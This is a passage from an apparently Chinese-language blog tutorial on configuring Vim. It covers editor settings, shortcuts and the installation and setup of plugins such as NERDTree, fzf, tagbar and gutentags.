<h2 id="10-代码配色"><a href="#10-代码配色" class="headerlink" title="10. 代码配色"></a>10. 代码配色</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">syntax</span> <span class="keyword">on</span>           <span class="comment">&quot; 代码配色</span></span><br><span class="line"><span class="keyword">colorscheme</span> xxx     <span class="comment">&quot; 配色方案采用xxx</span></span><br></pre></td></tr></table></figure>

<p>系统配色方案</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~|⇒ ls /usr/share/vim/vim74/colors</span><br><span class="line">blue.vim      delek.vim    evening.vim  murphy.vim     README.txt  slate.vim</span><br><span class="line">darkblue.vim  desert.vim   koehler.vim  pablo.vim      ron.vim     torte.vim</span><br><span class="line">default.vim   elflord.vim  morning.vim  peachpuff.vim  shine.vim   zellner.vim</span><br></pre></td></tr></table></figure>

<h3 id="添加配色方案"><a href="#添加配色方案" class="headerlink" title="添加配色方案"></a>添加配色方案</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xxx</span><br><span class="line">mv xxx/colors ~/.vim/colors</span><br></pre></td></tr></table></figure>

<h3 id="推荐配色方案"><a href="#推荐配色方案" class="headerlink" title="推荐配色方案"></a>推荐配色方案</h3><ul>
<li>molokai: <code>https://github.com/tomasr/molokai.git</code></li>
</ul>
<h2 id="11-vimg-全局搜索"><a href="#11-vimg-全局搜索" class="headerlink" title="11. vimg 全局搜索"></a>11. vimg 全局搜索</h2><h3 id="命令-2"><a href="#命令-2" class="headerlink" title="命令"></a>命令</h3><ul>
<li><code>:vimgrep /xxx/ %</code> :搜索xxx，在当前文件</li>
<li><code>:vimgrep /xxx/ % | copen</code> :搜索xxx，在当前文件，打开quickfix</li>
<li><code>:vimgrep /xxx/ ./xxx/xxx/*/*.*</code> :搜索xxx，在xxx&#x2F;xxx&#x2F;下的一级子目录所有文件</li>
<li><code>:vimgrep /xxx/ ./xxx/xxx/**/*.*</code> :搜索xxx，在xxx&#x2F;xxx&#x2F;下的所有目录下的所有文件</li>
<li><code>:vimgrep /xxx/j ./xxx/xxx/**/*.*</code> :搜索xxx，在xxx&#x2F;xxx&#x2F;下的所有目录下的所有文件，j不跳转</li>
</ul>
<h3 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> hlsearch    <span class="comment">&quot; 高亮搜索结果</span></span><br><span class="line"><span class="keyword">set</span> incsearch   <span class="comment">&quot; 输入字符串实时跳转到搜索结果</span></span><br><span class="line"><span class="keyword">set</span> ignorecase  <span class="comment">&quot; 忽略大小写，一般不设置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 配置快捷键 &lt;leader&gt;f 全局搜索当前光标下单词</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">f</span> yi<span class="variable">w:vimg</span> /\<span class="keyword">c</span><span class="symbol">&lt;C-r&gt;</span><span class="comment">&quot;/j **/*.* \| copen</span></span><br></pre></td></tr></table></figure>

<h2 id="12-quickfix"><a href="#12-quickfix" class="headerlink" title="12. quickfix"></a>12. quickfix</h2><ul>
<li><code>:cn</code>: 跳转下一个定义</li>
<li><code>:cp</code>: 条状上一个定义</li>
<li><code>:copen</code>: 打开quickfix</li>
<li><code>:[n]cc</code>: 跳转到第n行的quickfix</li>
<li><code>:[n]cn</code>: 跳转向下n行的quickfix</li>
<li><code>:[n]cp</code>: 跳转向上n行的quickfix</li>
</ul>
<h2 id="13-折叠"><a href="#13-折叠" class="headerlink" title="13. 折叠"></a>13. 折叠</h2><h3 id="配置-4"><a href="#配置-4" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> foldenable          <span class="comment">&quot; 开启折叠</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">foldlevel</span>=<span class="number">999</span>       <span class="comment">&quot; 设置折叠级别为999，也就是不自动折叠</span></span><br><span class="line"><span class="keyword">set</span> foldmethod=<span class="built_in">indent</span>   <span class="comment">&quot; 使用按照缩进折叠的模式</span></span><br></pre></td></tr></table></figure>

<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li><code>z + c</code>: 折叠</li>
<li><code>z + o</code>: 不折叠</li>
</ul>
<h3 id="从m行到n行折叠"><a href="#从m行到n行折叠" class="headerlink" title="从m行到n行折叠"></a>从m行到n行折叠</h3><ul>
<li><code>:set foldmethod=manual</code>: 设置折叠方式为手工折叠</li>
<li><code>:(m),(n)fo</code>: m行到n行折叠</li>
</ul>
<h2 id="14-标签页"><a href="#14-标签页" class="headerlink" title="14. 标签页"></a>14. 标签页</h2><h3 id="命令和快捷键"><a href="#命令和快捷键" class="headerlink" title="命令和快捷键"></a>命令和快捷键</h3><ul>
<li><code>:tabnew</code>: 打开一个新标签</li>
<li><code>:tabc</code>: 关闭当前的tab</li>
<li><code>:tabo</code> 关闭所有其他的tab</li>
<li><code>:tabs</code> 查看所有打开的tab</li>
<li><code>:tabn</code>或者<code>gt</code>: 下一个标签</li>
<li><code>:tabp</code>或者<code>g, Shift + t</code>: 上一个标签</li>
<li><code>n, gt</code>: 跳转到第几个标签</li>
</ul>
<h3 id="配置-5"><a href="#配置-5" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; ctrl + n 打开新标签页</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;C-n&gt;</span> :<span class="keyword">tabnew</span><span class="symbol">&lt;cr&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="15-缓冲区"><a href="#15-缓冲区" class="headerlink" title="15. 缓冲区"></a>15. 缓冲区</h2><h3 id="命令和快捷键-1"><a href="#命令和快捷键-1" class="headerlink" title="命令和快捷键"></a>命令和快捷键</h3><ul>
<li><code>:ls</code>: 查看当前所有缓冲区</li>
</ul>
<h2 id="16-自建命令"><a href="#16-自建命令" class="headerlink" title="16. 自建命令"></a>16. 自建命令</h2><h3 id="配置-6"><a href="#配置-6" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">command</span> -nargs=<span class="number">0</span> xxx xxx</span><br></pre></td></tr></table></figure>

<p>其中nargs定义如下，默认为-nargs&#x3D;0</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-nargs=0    # No arguments</span><br><span class="line">-nargs=1    # One argument</span><br><span class="line">-nargs=*    # Any number of arguments</span><br><span class="line">-nargs=?    # Zero or one argument</span><br><span class="line">-nargs=+    # One or more arguments</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">command</span> -nargs=<span class="number">0</span> JsFormat <span class="keyword">call</span> JsBeautify()</span><br></pre></td></tr></table></figure>

<h2 id="17-分屏"><a href="#17-分屏" class="headerlink" title="17. 分屏"></a>17. 分屏</h2><ul>
<li><code>:vs</code>: 横向分屏</li>
<li><code>:split</code>: 纵向分屏</li>
<li><code>Ctrl + w, (n), Shift + &gt;</code>: 横向扩充窗口大小n，默认为1</li>
<li><code>Ctrl + w, (n), Shift + &lt;</code>: 横向减少窗口大小n，默认为1</li>
<li><code>Ctrl + w, (n), Shift + +</code>: 纵向扩充窗口大小n，默认为1</li>
<li><code>Ctrl + w, (n), Shift + -</code>: 纵向减少窗口大小n，默认为1</li>
<li><code>Ctrl + w, =</code>: 横向纵向平分窗口大小</li>
<li><code>Ctrl + w, h</code>: 跳转到左侧窗口</li>
<li><code>Ctrl + w, l</code>: 跳转到右侧窗口</li>
<li><code>Ctrl + w, j</code>: 跳转到上侧窗口</li>
<li><code>Ctrl + w, k</code>: 跳转到下侧窗口</li>
<li><code>:res, N</code>: 调整当前屏高度</li>
<li><code>:vertical res, N</code>: 调整当前屏宽度</li>
<li><code>Ctrl + w, Shift + K</code>: 调整分屏，将当前屏作为上半部分</li>
<li><code>Ctrl + w, Shift + J</code>: 调整分屏，将当前屏作为下半部分</li>
<li><code>Ctrl + w, Shift + H</code>: 调整分屏，将当前屏作为左半部分</li>
<li><code>Ctrl + w, Shift + L</code>: 调整分屏，将当前屏作为右半部分</li>
</ul>
<h2 id="18-文件比对"><a href="#18-文件比对" class="headerlink" title="18. 文件比对"></a>18. 文件比对</h2><h3 id="命令和快捷键-2"><a href="#命令和快捷键-2" class="headerlink" title="命令和快捷键"></a>命令和快捷键</h3><ul>
<li><code>:diffthis</code>: 当前文件加入对比，分屏多个文件后，对要比对的文件执行命令就会进行diff对比</li>
<li><code>d</code>、<code>p</code>: 当前差异块应用到另一个文件</li>
<li><code>d</code>、<code>o</code>: 当前差异块应用到本文件</li>
<li><code>:[range]diffput</code>: 第几行应用到另一个文件，range可以是单个行号或者逗号分隔的行号</li>
<li><code>:[range]diffget</code>: 第几行应用到另一个文件，range同上</li>
<li><code>]</code>、<code>c</code>: 跳转下一个差异块</li>
<li><code>[</code>、<code>c</code>: 跳转上一个差异块</li>
</ul>
<h2 id="19-计算器"><a href="#19-计算器" class="headerlink" title="19. 计算器"></a>19. 计算器</h2><ul>
<li>没错，没看错，vim自带计算器，可以在写东西时方便插入表达式结果</li>
<li>插入模式或者命令模式，输入<code>Ctrl + r, =</code>就可以输入你的表达式，回车会把结果插入到文本或者命令中</li>
<li>比如需要计算sin，输入<code>sin(30°)=&lt;C-r&gt;=sin(3.1415926/6)&lt;cr&gt;</code>可以得到<code>sin(30°)=0.5</code></li>
<li>当前系统时间输入<code>date: &lt;C-r&gt;=strftime(&#39;%Y-%m-%d %H:%M:%S&#39;)&lt;cr&gt;</code></li>
</ul>
<h2 id="20-自建快捷键"><a href="#20-自建快捷键" class="headerlink" title="20. 自建快捷键"></a>20. 自建快捷键</h2><h3 id="20-1-查看快捷键映射"><a href="#20-1-查看快捷键映射" class="headerlink" title="20.1. 查看快捷键映射"></a>20.1. 查看快捷键映射</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">map</span> xxx</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">map</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">c</span></span><br></pre></td></tr></table></figure>

<h2 id="21-vim中的正则表达式"><a href="#21-vim中的正则表达式" class="headerlink" title="21. vim中的正则表达式"></a>21. vim中的正则表达式</h2><ul>
<li><code>\|</code>: 代表或，需要加转义</li>
<li><code>\&lt;aaa\&gt;</code>: 代表单词开头和结尾，也就是仅匹配aaa整个单词，前后不能存在字母</li>
</ul>
<h2 id="22-设置颜色"><a href="#22-设置颜色" class="headerlink" title="22. 设置颜色"></a>22. 设置颜色</h2><h3 id="22-1-实例"><a href="#22-1-实例" class="headerlink" title="22.1. 实例"></a>22.1. 实例</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; NONE代表无色，也就是透明</span></span><br><span class="line">:<span class="keyword">hi</span> CursorLine   cterm=NONE ctermbg=<span class="number">240</span></span><br><span class="line">:<span class="keyword">hi</span> CursorColumn   cterm=NONE ctermbg=<span class="number">240</span></span><br></pre></td></tr></table></figure>

<h3 id="22-2-标识"><a href="#22-2-标识" class="headerlink" title="22.2. 标识"></a>22.2. 标识</h3><ul>
<li>CursorLine: 光标所在行</li>
<li>CursorColumn: 光标所在列</li>
<li>Normal: normal状态</li>
<li>Visual: 被visual模式下选择的文本</li>
</ul>
<h2 id="23-系统剪贴板"><a href="#23-系统剪贴板" class="headerlink" title="23. 系统剪贴板"></a>23. 系统剪贴板</h2><ul>
<li>使用系统剪贴板需要先查看vim是否支持clipboard</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; vim --version | grep clipboard</span><br><span class="line">+clipboard         +keymap            +printer           +vertsplit</span><br><span class="line">+eval              -mouse_jsbterm     -sun_workshop      +xterm_clipboard</span><br></pre></td></tr></table></figure>

<ul>
<li>然后设置一个快捷键，在visual模式下，<code>ctrl y</code>复制到系统剪贴板</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; ctrl y copy to system clipboard at visual mode</span></span><br><span class="line"><span class="keyword">vnoremap</span> <span class="symbol">&lt;C-y&gt;</span> <span class="comment">&quot;+y</span></span><br></pre></td></tr></table></figure>

<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><h3 id="1-多行缩进"><a href="#1-多行缩进" class="headerlink" title="1) 多行缩进"></a>1) 多行缩进</h3><ol>
<li><code>v</code>进入VISUAL状态</li>
<li>选中多行</li>
<li><code>(n), Shift + &gt;</code>缩进n次，默认1；<code>(n), Shift + &lt;</code>缩退n次，默认1</li>
</ol>
<h3 id="2-多行编辑"><a href="#2-多行编辑" class="headerlink" title="2) 多行编辑"></a>2) 多行编辑</h3><p><strong>多行删除</strong></p>
<ol>
<li><code>Ctrl + v</code>进入V-BLOCK模式</li>
<li>选中一整块</li>
<li><code>d</code>删除</li>
</ol>
<p><strong>多行插入</strong></p>
<ol>
<li><code>Ctrl + v</code>进入V-BLOCK模式</li>
<li>上下移动光标，到最后要插入的一行</li>
<li><code>Shift + i</code>插入，输入要添加的字符</li>
<li><code>Esc</code>退出编辑模式就会自动添加，不过要等几秒处理时间</li>
</ol>
<h3 id="3-粘贴不乱缩进"><a href="#3-粘贴不乱缩进" class="headerlink" title="3) 粘贴不乱缩进"></a>3) 粘贴不乱缩进</h3><ol>
<li><code>:set paste</code>进入粘贴模式</li>
<li>粘贴将不会自动缩进</li>
<li><code>:set nopaste</code>退出粘贴模式</li>
</ol>
<h3 id="4-查看值上一次被谁改动"><a href="#4-查看值上一次被谁改动" class="headerlink" title="4) 查看值上一次被谁改动"></a>4) 查看值上一次被谁改动</h3><ol>
<li><code>:verbose set xxx</code>: 查看xxx上一次是在什么地方被改动</li>
</ol>
<h1 id="二、配置vimIde的各项插件"><a href="#二、配置vimIde的各项插件" class="headerlink" title="二、配置vimIde的各项插件"></a>二、配置vimIde的各项插件</h1><h2 id="1-插件安装统一方法"><a href="#1-插件安装统一方法" class="headerlink" title="1. 插件安装统一方法"></a>1. 插件安装统一方法</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xxx ~/.vim/bundle/xxx</span><br><span class="line">cd ~/.vim/bundle/xxx        # 到目录查看</span><br><span class="line">git tag                     # 查看版本号</span><br><span class="line">git checkout xxxx           # 切换到需要的版本</span><br><span class="line">rm -rf .git*                # 删除.git目录释放空间，也可以保留用于升级</span><br></pre></td></tr></table></figure>

<h3 id="配置-7"><a href="#配置-7" class="headerlink" title="配置"></a>配置</h3><p>在<code>.vimrc</code>里面添加</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/xxx</span><br></pre></td></tr></table></figure>

<h2 id="2-文件树插件-NERDTree"><a href="#2-文件树插件-NERDTree" class="headerlink" title="2. 文件树插件 NERDTree"></a>2. 文件树插件 NERDTree</h2><p><a href="https://github.com/scrooloose/nerdtree.git">https://github.com/scrooloose/nerdtree.git</a></p>
<h3 id="配置-8"><a href="#配置-8" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 设置打开文件树的快捷键为F10，并且打开时打开当前文件所在位置</span></span><br><span class="line">func TreeToggle()</span><br><span class="line">    <span class="keyword">if</span> !filereadable(<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        NERDTreeToggle</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">endif</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">g:NERDTree</span>.IsOpen()</span><br><span class="line">        NERDTreeToggle</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        NERDTreeFind</span><br><span class="line">    <span class="keyword">endif</span></span><br><span class="line">endfunc</span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;F10&gt;</span> :<span class="keyword">call</span> TreeToggle()<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; 显示隐藏文件</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDTreeShowHidden</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">&quot; start neartree when vim start</span></span><br><span class="line"><span class="keyword">autocmd</span> VimEnter * NERDTree</span><br><span class="line"><span class="comment">&quot; point cursor at buffer window</span></span><br><span class="line"><span class="keyword">autocmd</span> VimEnter * <span class="keyword">wincmd</span> <span class="keyword">w</span></span><br></pre></td></tr></table></figure>

<h3 id="快捷键-1"><a href="#快捷键-1" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li><code>Shift + c</code>: 切换当前目录为工作目录</li>
<li><code>cd</code>: 切换光标所在目录为vim所在路径</li>
<li><code>Shift + i</code>: 显示和不显示隐藏文件</li>
<li><code>r</code>: 递归刷新光标所在目录</li>
<li><code>Shift + r</code>: 递归刷新根节点所在目录</li>
<li><code>m</code>: 编辑当前目录</li>
<li><code>s</code>: 横向分屏打开文件</li>
<li><code>i</code>: 纵向分屏打开文件</li>
<li><code>o</code>: 打开文件</li>
<li><code>g, s</code>: 横向分屏打开文件，光标还在nerdtree</li>
<li><code>g, i</code>: 纵向分屏打开文件，光标还在nerdtree</li>
<li><code>g, o</code>: 打开文件，光标还在nerdtree</li>
<li><code>x</code>: 收起光标所在的父目录</li>
<li><code>p</code>: 跳转到当前的父目录</li>
<li><code>Shift + j</code>: 同级最后一个</li>
<li><code>Shift + k</code>: 同级第一个</li>
<li><code>Ctrl + j</code>: 同级下一个</li>
<li><code>Ctrl + k</code>: 同级上一个</li>
</ul>
<h2 id="3-C-C-格式化-clang-format"><a href="#3-C-C-格式化-clang-format" class="headerlink" title="3. C&#x2F;C++格式化 clang-format"></a>3. C&#x2F;C++格式化 clang-format</h2><p><a href="https://github.com/rhysd/vim-clang-format.git">https://github.com/rhysd/vim-clang-format.git</a></p>
<h3 id="配置-9"><a href="#配置-9" class="headerlink" title="配置"></a>配置</h3><p><strong>vim</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">g:clang_format</span>#auto_format_on_insert_leave=<span class="number">1</span>  <span class="comment">&quot; 在离开编辑模式时自动格式化</span></span><br></pre></td></tr></table></figure>

<p><strong>clang-format</strong></p>
<ul>
<li>clang-format想要自定义config，需要创建<code>~/.clang-format</code></li>
<li>下面是几个我常用的配置，其他可以参考<a href="https://blog.csdn.net/softimite_zifeng/article/details/78357898">Clang-Format格式化选项介绍</a>和<a href="https://www.cnblogs.com/PaulpauL/p/5929753.html">clang format 官方文档自定义参数介绍（中英文）</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以Google的格式化为基准，后面是自定义配置</span></span><br><span class="line">BasedOnStyle: Google</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">缩进宽度4</span></span><br><span class="line">IndentWidth: 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tab宽度4</span></span><br><span class="line">TabWidth: 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将头文件排序</span></span><br><span class="line">SortIncludes: true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">public和private顶格写</span></span><br><span class="line">AccessModifierOffset: -4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尾随注释对齐</span></span><br><span class="line">AlignTrailingComments: true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连续声明的变量对齐</span></span><br><span class="line">AlignConsecutiveDeclarations: true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">行换行最长120字符</span></span><br><span class="line">ColumnLimit: 120</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许短函数放到一行，None, InlineOnly(定义在类中), Empty(空函数), Inline(定义在类中，空函数), All</span></span><br><span class="line">AllowShortFunctionsOnASingleLine: Empty</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">函数调用的参数要么在同一行，要么各占一行</span></span><br><span class="line">BinPackArguments: false</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">函数声明的参数要么在同一行，要么各占一行</span></span><br><span class="line">BinPackParameters: false</span><br></pre></td></tr></table></figure>

<h2 id="4-标签树-tagbar"><a href="#4-标签树-tagbar" class="headerlink" title="4. 标签树 tagbar"></a>4. 标签树 tagbar</h2><p><a href="https://github.com/preservim/tagbar">https://github.com/preservim/tagbar</a></p>
<h3 id="配置-10"><a href="#配置-10" class="headerlink" title="配置"></a>配置</h3><ul>
<li>需要ctags的支持，自行安装</li>
<li>小技巧查看<a href="/blogs/2019-09-12-softwareTips/#ctags">ctags</a></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; F9作为tagbar的快捷键</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;F9&gt;</span> :TagbarToggle<span class="symbol">&lt;CR&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="快捷键-2"><a href="#快捷键-2" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li><code>Shift + *</code>: 展开所有标签内容</li>
<li><code>=</code>: 折叠所有标签内容</li>
<li><code>o</code>: 展开&#x2F;折叠当前光标所在标签</li>
<li><code>p</code>: 预览定义位置，光标还处于tagbar</li>
</ul>
<h2 id="5-代码提示-tabnine"><a href="#5-代码提示-tabnine" class="headerlink" title="5. 代码提示 tabnine"></a>5. 代码提示 tabnine</h2><p><a href="https://github.com/zxqfl/tabnine-vim.git">https://github.com/zxqfl/tabnine-vim.git</a></p>
<ul>
<li>不过tabnine太耗性能了，毕竟什么语言都能提示</li>
<li>可以直接安装YCM，比较专一，js、c&#x2F;c++、rust、go、java、python</li>
</ul>
<h2 id="6-多行注释插件-nerdcommenter"><a href="#6-多行注释插件-nerdcommenter" class="headerlink" title="6. 多行注释插件 nerdcommenter"></a>6. 多行注释插件 nerdcommenter</h2><p><a href="https://github.com/scrooloose/nerdcommenter.git">https://github.com/scrooloose/nerdcommenter.git</a></p>
<h3 id="配置-11"><a href="#配置-11" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDSpaceDelims</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDCreateDefaultMappings</span> = <span class="number">0</span></span><br><span class="line"><span class="comment">&quot; 使用&lt;leader&gt;空格设置或取消注释</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;space&gt;</span> <span class="symbol">&lt;Plug&gt;</span>NERDCommenterToggle</span><br><span class="line"><span class="keyword">vmap</span> <span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;space&gt;</span> <span class="symbol">&lt;Plug&gt;</span>NERDCommenterToggle</span><br></pre></td></tr></table></figure>

<h2 id="7-自动补全括号-auto-pairs"><a href="#7-自动补全括号-auto-pairs" class="headerlink" title="7. 自动补全括号 auto-pairs"></a>7. 自动补全括号 auto-pairs</h2><p><a href="https://github.com/jiangmiao/auto-pairs.git">https://github.com/jiangmiao/auto-pairs.git</a></p>
<h2 id="8-nerdtree的git插件-nerdtree-git-plugin"><a href="#8-nerdtree的git插件-nerdtree-git-plugin" class="headerlink" title="8. nerdtree的git插件 nerdtree-git-plugin"></a>8. nerdtree的git插件 nerdtree-git-plugin</h2><p><a href="https://github.com/Xuyuanp/nerdtree-git-plugin.git">https://github.com/Xuyuanp/nerdtree-git-plugin.git</a></p>
<h2 id="9-文件搜索-fzf"><a href="#9-文件搜索-fzf" class="headerlink" title="9. 文件搜索 fzf"></a>9. 文件搜索 fzf</h2><p><a href="https://github.com/junegunn/fzf.vim.git">https://github.com/junegunn/fzf.vim.git</a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>fzf依赖于shell工具fzf，所以要安装fzf才可以使用vim插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/junegunn/fzf.git           # 克隆fzf到本地</span><br><span class="line">sudo mv fzf /opt/                                       # 移动fzf到opt目录</span><br><span class="line">/opt/fzf/install                                        # 安装fzf到本地</span><br></pre></td></tr></table></figure>

<h3 id="配置-12"><a href="#配置-12" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; fzf-vim</span></span><br><span class="line"><span class="keyword">set</span> rtp+=/<span class="keyword">opt</span>/fzf               <span class="comment">&quot; 添加fzf软件支持</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/fzf.<span class="keyword">vim</span>  <span class="comment">&quot; 添加fzf的vim插件支持</span></span><br><span class="line"><span class="comment">&quot; 仿vscode，ctrl+p查找全局文件打开</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;c-p&gt;</span> :GitFiles<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; ctrl+f，查找当前文件内容</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;c-f&gt;</span> :BLines<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; &#x27;Ctrl + b&#x27;，查找当前打开的文件</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">b</span> :Buffers<span class="symbol">&lt;cr&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="快捷键-3"><a href="#快捷键-3" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li><code>:FZF</code>: 模糊搜索当前目录下及子目录的文件</li>
<li><code>:BLines</code>: 模糊搜索当前文件中某一行字段</li>
<li><code>:Buffers</code>: 模糊搜索历史打开过的文件</li>
<li><code>:GitFiles</code>: 查找被git跟踪的文件</li>
<li><code>:GitFiles?</code>: 查找git中检测到的改动的文件</li>
</ul>
<p><strong>搜索框快捷键</strong></p>
<ul>
<li><code>Ctrl + j/k</code>: 上下选择</li>
<li><code>Ctrl + x</code>: 水平分屏打开</li>
<li><code>Ctrl + v</code>: 垂直分屏打开</li>
<li><code>Ctrl + t</code>: 在tab页打开</li>
</ul>
<h2 id="10-裁剪尾部空格-vim-trailing-whitespace"><a href="#10-裁剪尾部空格-vim-trailing-whitespace" class="headerlink" title="10. 裁剪尾部空格 vim-trailing-whitespace"></a>10. 裁剪尾部空格 vim-trailing-whitespace</h2><p><a href="https://github.com/bronson/vim-trailing-whitespace.git">https://github.com/bronson/vim-trailing-whitespace.git</a></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 写入缓冲区前自动裁剪尾部空格</span></span><br><span class="line"><span class="keyword">autocmd</span> BufWritePre * FixWhitespace</span><br></pre></td></tr></table></figure>

<h2 id="11-quickfix分屏预览-vim-preview"><a href="#11-quickfix分屏预览-vim-preview" class="headerlink" title="11. quickfix分屏预览 vim-preview"></a>11. quickfix分屏预览 vim-preview</h2><p><a href="https://github.com/greyblake/vim-preview.git">https://github.com/greyblake/vim-preview.git</a></p>
<h3 id="配置-13"><a href="#配置-13" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 小写p打开预览窗口</span></span><br><span class="line"><span class="keyword">autocmd</span> FileType qf <span class="keyword">nnoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;buffer&gt;</span> <span class="keyword">p</span> :PreviewQuickfix<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; 大写P关闭预览窗口</span></span><br><span class="line"><span class="keyword">autocmd</span> FileType qf <span class="keyword">nnoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;buffer&gt;</span> <span class="keyword">P</span> :PreviewClose<span class="symbol">&lt;cr&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="12-代码标签跳转-vim-gutentags和gutentags-plus"><a href="#12-代码标签跳转-vim-gutentags和gutentags-plus" class="headerlink" title="12. 代码标签跳转 vim-gutentags和gutentags-plus"></a>12. 代码标签跳转 vim-gutentags和gutentags-plus</h2><p><a href="https://github.com/ludovicchabant/vim-gutentags">https://github.com/ludovicchabant/vim-gutentags</a><br><a href="https://github.com/skywind3000/gutentags_plus">https://github.com/skywind3000/gutentags_plus</a></p>
<h3 id="ctags-cscope和gtags-gscope的理解"><a href="#ctags-cscope和gtags-gscope的理解" class="headerlink" title="ctags&#x2F;cscope和gtags&#x2F;gscope的理解"></a>ctags&#x2F;cscope和gtags&#x2F;gscope的理解</h3><ul>
<li>ctags是最普通的标签生成跳转工具，生成的tags文件是适配vim的tags功能的，只能跳转定义，不能查找引用</li>
<li>cscope是为了查找引用的工具，生成的是cscope.out文件，可以查找定义查找引用</li>
<li>gtags是ctags的增强版，可以查找引用查找定义，生成的是三个G开头的文件，增强功能是可以查找引用</li>
<li>gscope是cscope的增强版，和gtags搭配，可以使用gtags的三个文件来进行引用查找</li>
<li>gscope和cscope最大的区别是，改了工程文件，cscope需要重启来重新加载文件，而gscope和gtags不用，可以增量更新</li>
</ul>
